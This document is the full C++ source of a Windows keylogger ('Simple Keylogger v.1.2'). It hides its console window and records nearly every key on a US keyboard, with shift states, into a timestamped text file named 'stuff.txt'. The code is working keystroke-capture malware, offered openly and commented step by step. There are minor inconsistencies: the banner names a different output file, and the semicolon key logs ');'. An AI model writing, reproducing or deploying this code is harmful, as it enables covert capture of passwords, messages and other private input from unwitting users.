//All of the libraries used:
#include <iostream>    //Standard Input/Output library
#include <windows.h>   //Windows special system library
#include <conio.h>     //More I/O libraries
#include <fstream>     //Fstream means "File-Stream"
#include <ctime>       //Simply the system clock library, used to access date and time for keylog entries
//The namespace for <iostream> so that you don't have to put "std::" in front of every I/O line
using namespace std;
//The function to log keys to the text document. It is a void function with no special parameters
void log(char key[2]){
	ofstream myfile;  //Sets up a packet called "myfile" to define the keylog file
	myfile.open("stuff.txt",ios::out|ios::app);  //Opens the keylog file. This will create a new file if one does not exist
	myfile<<key;      //Prints the key pressed to the file (the variable "key" is created in the function's parameters)
	myfile.close();   //Close and save "myfile"
	//cout<<key;    //Save for later? It logs keys to the console as well, but why do it if nobody sees it?
}
//The main code:
int main(){
	/////////////////////////////////////////////
	time_t now = time(0);    //set a time variable
	char* dt = ctime(&now);  //turn that variable into a printable string
	ofstream myfile;
	myfile.open("stuff.txt",ios::out|ios::app);
	myfile<<"\n\nKeylogs for: "; 
	myfile<<dt;         //Print the entry date to the keylog file
	myfile<<"\n\n";
	myfile.close();
	/////////////////////////////////////////////
	bool pressed=false;  //Set up a boolean operator for whether or not a key is pressed, to be used later
	int hidden=0;        //Set up the variable for hiding the window
	system("color a");   //Yay! Colors the text in the console a pretty neat green
	//The following prints the text at the start of the program
	cout<<"Simple Keylogger v.1.2\n\nThis program will record any keys pressed while running.\nRecorded keys will appear on a .txt file called keylogs,\nin the same folder as this application. \nTo start the program, press ENTER.\nWhen you do so, this window will hide itself.\nClose the program later from the task manager.";
	//The code for keeping the window open and no keylogging going until the user hits ENTER
	while(hidden==0){
		if(GetAsyncKeyState(VK_RETURN)&0x8000){
			ShowWindow(GetConsoleWindow(),SW_HIDE);    //Hide the window
			hidden=1;    //Set the hidden state var. to TRUE
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_RETURN)&0x8000){
					Sleep(1);
				}else{
					pressed=false;   //Make it so that when it is pressed, it doesn't span endless ENTER keys for the keylogs, it has to wait until the key is released
				}
			}
		}
	}
	//Now that hidden==1, start the keylogging. Notice this uses the Log function from earlier, to log the keys to the text file
	while(hidden==1){
		if(GetAsyncKeyState(0x41)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("A");         //this covers the key "a". The IF statement it is in finds if the shift key is being held, to see if it is a capital or lowercase "a"
			}else{                //All of the rest include all of the characters on a US standard keyboard, including BACKSPACE, ENTER, TAB, CAPS LOCK, etc.
				log("a");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x41)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x42)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("B");
			}else{
				log("b");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x42)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x43)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("C");
			}else{
				log("c");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x43)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x44)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("D");
			}else{
				log("d");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x44)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x45)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("E");
			}else{
				log("e");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x45)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x46)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("F");
			}else{
				log("f");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x46)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x47)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("G");
			}else{
				log("g");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x47)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x48)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("H");
			}else{
				log("h");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x48)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x49)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("I");
			}else{
				log("i");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x49)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x4A)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("J");
			}else{
				log("j");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x4A)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x4B)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("K");
			}else{
				log("k");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x4B)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x4C)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("L");
			}else{
				log("l");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x4C)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x4D)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("M");
			}else{
				log("m");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x4D)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x4E)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("N");
			}else{
				log("n");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x4E)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x4F)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("O");
			}else{
				log("o");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x4F)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x50)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("P");
			}else{
				log("p");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x50)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x51)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("Q");
			}else{
				log("q");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x51)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x52)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("R");
			}else{
				log("r");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x52)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x53)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("S");
			}else{
				log("s");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x53)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x54)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("T");
			}else{
				log("t");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x54)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x55)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("U");
			}else{
				log("u");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x55)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x56)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("V");
			}else{
				log("v");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x56)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x57)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("W");
			}else{
				log("w");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x57)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x58)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("X");
			}else{
				log("x");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x58)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x59)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("Y");
			}else{
				log("y");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x59)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x5A)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("Z");
			}else{
				log("z");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x5A)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_SPACE)&0x8000){
			log(" ");
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_SPACE)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_RETURN)&0x8000){
			log("\n  _Enter_Key_  \n");
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_RETURN)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_TAB)&0x8000){
			log("\n  _Tab_Key_  \n");
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_TAB)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_CAPITAL)&0x8000){
			log("\n  _CAPS_LOCK_  \n");
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_CAPITAL)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x31)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("!");
			}else{
				log("1");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x31)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x32)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("@");
			}else{
				log("2");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x32)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x33)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("#");
			}else{
				log("3");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x33)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x34)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("$");
			}else{
				log("4");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x34)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x35)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				if(GetAsyncKeyState(VK_CONTROL)&0x8000){
				}else{
					log("%");
				}
			}else{
				log("5");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x35)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x36)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				if(GetAsyncKeyState(VK_CONTROL)&0x8000){
				}else{
					log("^");
				}
			}else{
				log("6");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x36)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x37)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("&");
			}else{
				log("7");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x37)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x38)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("*");
			}else{
				log("8");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x38)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x39)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("(");
			}else{
				log("9");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x39)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(0x30)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log(")");
			}else{
				log("0");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(0x30)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_1)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log(":");
			}else{
				log(");");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_1)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_PLUS)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("+");
			}else{
				log("=");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_PLUS)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_MINUS)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("_");
			}else{
				log("-");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_MINUS)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_COMMA)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("<");
			}else{
				log(",");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_COMMA)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_PERIOD)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log(">");
			}else{
				log(".");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_PERIOD)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_2)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("?");
			}else{
				log("/");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_2)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_3)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("~");
			}else{
				log("`");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_3)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_4)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("{");
			}else{
				log("[");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_4)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_5)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("|");
			}else{
				log("\\");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_5)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_6)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("}");
			}else{
				log("]");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_6)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_OEM_7)&0x8000){
			if(GetAsyncKeyState(VK_SHIFT)&0x8000){
				log("\"");
			}else{
				log("'");
			}
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_OEM_7)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
		if(GetAsyncKeyState(VK_BACK)&0x8000){
			log("\n  _Backspace_  \n");
			pressed=true;
			while(pressed==true){
				if(GetAsyncKeyState(VK_BACK)&0x8000){
					Sleep(1);
				}else{
					pressed=false;
				}
			}
		}
	}
}
